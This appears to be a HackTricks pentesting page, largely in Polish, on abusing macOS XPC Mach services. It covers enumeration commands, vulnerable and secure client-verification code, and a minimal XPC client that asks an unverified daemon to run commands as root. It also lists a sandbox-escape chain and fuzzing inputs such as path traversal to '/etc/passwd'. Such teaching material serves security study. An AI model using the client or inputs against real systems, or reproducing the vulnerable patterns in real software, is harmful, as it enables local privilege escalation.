# Abuse XPC Mach Services w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

**XPC** (Cross-Process Communication) to podstawowy mechanizm IPC w macOS. Daemony systemowe udostępniają **Mach services** — nazwane porty zarejestrowane przez `launchd`, z którymi inne procesy mogą łączyć się za pomocą `NSXPCConnection`.<sup>[[1]](#references)</sup>

Każdy plik plist typu **LaunchDaemon** i **LaunchAgent** zawierający klucz `MachServices` rejestruje co najmniej jeden nazwany port Mach. Są to ogólnosystemowe endpointy XPC, z którymi każdy proces może próbować się połączyć.<sup>[[2]](#references)</sup>

> [!WARNING]
> XPC Mach services to **największa pojedyncza powierzchnia ataku lokalnego podniesienia uprawnień** w macOS. Większość lokalnych exploitów umożliwiających uzyskanie uprawnień root w ostatnich latach wykorzystywała podatne usługi XPC w LaunchDaemons. Każda ujawniona metoda w daemonie działającym z uprawnieniami root stanowi potencjalny wektor eskalacji.

### Architektura
```
Client Process (user context)
↓ NSXPCConnection / xpc_connection_create_mach_service()
↓ Mach message via launchd
Daemon Process (root context)
↓ Receives XPC message
↓ (Should verify client identity / entitlements)
↓ Performs privileged operation
```
## Enumeracja

### Znajdowanie demonów z usługami Mach
```bash
# Find all LaunchDaemons with MachServices
find /Library/LaunchDaemons /System/Library/LaunchDaemons -name "*.plist" -exec sh -c '
plutil -p "{}" 2>/dev/null | grep -q "MachServices" && echo "{}"
' \; 2>/dev/null

# List active Mach services
sudo launchctl dumpstate 2>/dev/null | grep -E "name = " | sort -u | head -50

# List all launchd services
launchctl list

# Check a specific daemon's Mach services
plutil -p /Library/LaunchDaemons/com.example.daemon.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged, e.isDaemon
FROM executables e
WHERE e.isDaemon = 1
ORDER BY e.privileged DESC
LIMIT 50;"
```
### Enumerowanie interfejsów XPC

Po zidentyfikowaniu daemona przeprowadź reverse engineering jego interfejsu XPC:
```bash
# Find the protocol definition in the binary
strings /path/to/daemon | grep -i "protocol\|interface\|xpc\|method"

# Use class-dump to extract ObjC protocol definitions
class-dump /path/to/daemon | grep -A20 "@protocol"

# Check for XPC service bundles inside app bundles
find /Applications -path "*/XPCServices/*.xpc" 2>/dev/null
```
## Podatności weryfikacji klienta XPC

Najczęstszą klasą podatności w usługach XPC jest **niewystarczająca weryfikacja klienta**. Demon powinien weryfikować:

1. **Podpis kodu** procesu nawiązującego połączenie
2. **Entitlements** procesu nawiązującego połączenie
3. **Audit token** (nie PID, który może zostać ponownie użyty)

### Podatny wzorzec: brak weryfikacji
```objc
// VULNERABLE — daemon accepts any connection
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyProtocol)];
newConnection.exportedObject = self;
[newConnection resume];
return YES; // No verification!
}
```
### Podatny wzorzec: weryfikacja oparta na PID (race condition)
```objc
// VULNERABLE — PID can be reused between check and use
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
pid_t pid = newConnection.processIdentifier;
// Attacker can win race: spawn legitimate process → get PID → kill it → exploit process reuses PID
if ([self isAuthorizedPID:pid]) {
[newConnection resume];
return YES;
}
return NO;
}
```
### Bezpieczny wzorzec: weryfikacja tokenu audytu
```objc
// SECURE — Uses audit token which cannot be spoofed
- (BOOL)listener:(NSXPCListener *)listener
shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
audit_token_t token = newConnection.auditToken;

// Verify code signature via audit token
SecCodeRef code = NULL;
NSDictionary *attributes = @{(__bridge NSString *)kSecGuestAttributeAudit:
[NSData dataWithBytes:&token length:sizeof(token)]};
SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attributes,
kSecCSDefaultFlags, &code);

// Verify the signature matches expected signing identity
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(
CFSTR("identifier \"com.apple.expected\" and anchor apple"),
kSecCSDefaultFlags, &requirement);

OSStatus status = SecCodeCheckValidity(code, kSecCSDefaultFlags, requirement);
if (status == errSecSuccess) {
[newConnection resume];
return YES;
}
return NO;
}
```
## Atak: Łączenie z niezabezpieczonymi usługami XPC
```objc
// Minimal XPC client — connect to a LaunchDaemon's Mach service
#import <Foundation/Foundation.h>

@protocol VulnDaemonProtocol
- (void)runCommandAsRoot:(NSString *)command withReply:(void (^)(NSString *))reply;
@end

int main(void) {
@autoreleasepool {
NSXPCConnection *conn = [[NSXPCConnection alloc]
initWithMachServiceName:@"com.example.vulndaemon"
options:NSXPCConnectionPrivileged];

conn.remoteObjectInterface = [NSXPCInterface
interfaceWithProtocol:@protocol(VulnDaemonProtocol)];

[conn resume];

id<VulnDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"Connection error: %@", error);
}];

// If the daemon doesn't verify our identity, this works:
[proxy runCommandAsRoot:@"id" withReply:^(NSString *result) {
NSLog(@"Result: %@", result);
// Output: uid=0(root)
}];

[[NSRunLoop currentRunLoop] run];
}
}
```
## Atak: Deserializacja obiektów XPC

Usługi XPC, które akceptują złożone obiekty (zgodne z `NSSecureCoding`), mogą być podatne na **ataki deserializacyjne**:
```objc
// If the daemon accepts NSObject subclasses via XPC:
// An attacker can send a crafted object that triggers:
// 1. Type confusion (wrong class instantiated)
// 2. Path traversal (filename objects with ../)
// 3. Format string bugs (string objects as format arguments)
// 4. Integer overflow (large numeric values)
```
## Mach-Lookup Sandbox Exceptions

### How Exceptions Enable Sandbox Escape

Aplikacje działające w Sandbox mogą zwykle komunikować się wyłącznie z własnymi usługami XPC. Jednak **mach-lookup exceptions** umożliwiają dostęp do usług dostępnych w całym systemie:
```xml
<!-- Entitlement granting mach-lookup exception -->
<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>
<array>
<string>com.apple.system.opendirectoryd.api</string>
<string>com.apple.SecurityServer</string>
<string>com.apple.CoreServices.coreservicesd</string>
</array>
```
### Znajdowanie aplikacji z szerokimi wyjątkami
```bash
# Find sandboxed apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
echo "=== $(basename "$1") ==="
echo "$ents" | grep -B1 -A10 "mach-lookup"
}
}
' _ {} \; 2>/dev/null
```
### Łańcuch ucieczki z sandboxa
```
1. Compromise sandboxed app (e.g., via renderer exploit in browser/email)
2. Enumerate mach-lookup exceptions from entitlements
3. Connect to each reachable system daemon
4. Fuzz the daemon's XPC interface for vulnerabilities
5. Exploit a daemon bug → code execution outside the sandbox
6. Escalate from daemon's privilege level (often root)
```
## Uprzywilejowane narzędzia pomocnicze (SMJobBless)

### Jak działają

`SMJobBless` instaluje uprzywilejowany helper działający jako root za pośrednictwem launchd. Helper komunikuje się ze swoją aplikacją nadrzędną za pośrednictwem XPC:
```
App (user context) ←→ XPC ←→ Helper (root via launchd)
```
### Powszechna podatność: Słaba autoryzacja
```objc
// Many helpers check authorization but:
// 1. Don't verify WHO is connecting (any process can connect)
// 2. Use rights that any admin can obtain
// 3. Cache authorization decisions

// VULNERABLE helper pattern:
- (void)performPrivilegedAction:(NSString *)action
authorization:(NSData *)authData
withReply:(void (^)(BOOL))reply {
AuthorizationRef auth;
AuthorizationCreateFromExternalForm(
(AuthorizationExternalForm *)authData.bytes, &auth);

// Only checks if caller has generic admin right
// But doesn't verify the caller is the app that installed the helper!
AuthorizationItem item = {kAuthorizationRightExecute, 0, NULL, 0};
AuthorizationRights rights = {1, &item};

if (AuthorizationCopyRights(auth, &rights, NULL,
kAuthorizationFlagDefaults, NULL) == errAuthorizationSuccess) {
// Performs action as root...
reply(YES);
}
}
```
### Wykorzystywanie słabych helperów
```bash
# 1. Find installed privileged helpers
ls /Library/PrivilegedHelperTools/

# 2. Find their LaunchDaemon plists
ls /Library/LaunchDaemons/ | grep -v "com.apple"

# 3. Check the helper's XPC interface
class-dump /Library/PrivilegedHelperTools/com.example.helper | grep -A20 "@protocol"

# 4. Check if the parent app properly verifies connections
strings /Library/PrivilegedHelperTools/com.example.helper | grep -i "codesign\|requirement\|anchor\|audit"
# If no code-signing verification strings → likely vulnerable
```
## XPC Fuzzing
```bash
# Basic XPC fuzzing approach:

# 1. Identify the target service and protocol
plutil -p /Library/LaunchDaemons/com.example.daemon.plist
class-dump /path/to/daemon

# 2. For each exposed method, test:
#    - NULL arguments
#    - Empty strings
#    - Very long strings (buffer overflow)
#    - Path traversal strings (../../etc/passwd)
#    - Format strings (%n%n%n%n)
#    - Integer boundary values (INT_MAX, -1, 0)
#    - Unexpected object types (send NSDictionary where NSString expected)

# 3. Monitor for crashes
log stream --predicate 'process == "daemon-name" AND (eventMessage CONTAINS "crash" OR eventMessage CONTAINS "fault")'
```
## CVE z realnego świata

| CVE | Opis |
|---|---|
| CVE-2023-41993 | Luka w deserializacji usługi XPC |
| CVE-2022-22616 | Ominięcie Gatekeepera za pomocą abuse usługi XPC |
| CVE-2021-30657 | Escalation uprawnień w Sysmond XPC |
| CVE-2020-9839 | Race condition XPC w demonie systemowym |
| CVE-2019-8802 | Uprzywilejowane narzędzie pomocnicze bez weryfikacji klienta<sup>[[5]](#references)</sup> |
| CVE-2023-32369 | Migraine — ominięcie SIP przez XPC `systemmigrationd`<sup>[[3]](#references)</sup> |
| CVE-2022-26712 | Escalation do root przez PackageKit XPC<sup>[[4]](#references)</sup> |

## Skrypt enumeracji
```bash
#!/bin/bash
echo "=== XPC Mach Services Security Audit ==="

echo -e "\n[*] Third-party privileged helpers:"
for helper in /Library/PrivilegedHelperTools/*; do
[ -f "$helper" ] || continue
echo "  $helper"
codesign -dvv "$helper" 2>&1 | grep "Authority\|TeamIdentifier" | sed 's/^/    /'
done

echo -e "\n[*] Third-party LaunchDaemons with MachServices:"
for plist in /Library/LaunchDaemons/*.plist; do
plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
echo "  $plist"
plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
}
done

echo -e "\n[*] User LaunchAgents with MachServices:"
for plist in ~/Library/LaunchAgents/*.plist; do
plutil -p "$plist" 2>/dev/null | grep -q "MachServices" && {
echo "  $plist"
plutil -p "$plist" | grep -A5 "MachServices" | sed 's/^/    /'
}
done
```
## References

- [1] [Apple Developer — Usługi XPC](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
- [2] [Apple Developer — Przewodnik programowania demonów i usług](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/Introduction.html)
- [3] [Nowa luka w macOS, Migraine, może ominąć System Integrity Protection — Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [4] [CVE-2022-26712: POC umożliwiający obejście SIP można opublikować nawet na Twitterze](https://jhftss.github.io/CVE-2022-26712-The-POC-For-SIP-Bypass-Is-Even-Tweetable/)
- [5] [Objective-See — Walidacja klienta XPC i Rootpipe](https://objective-see.org/blog/blog_0x3E.html)
{{#include ../../../banners/hacktricks-training.md}}
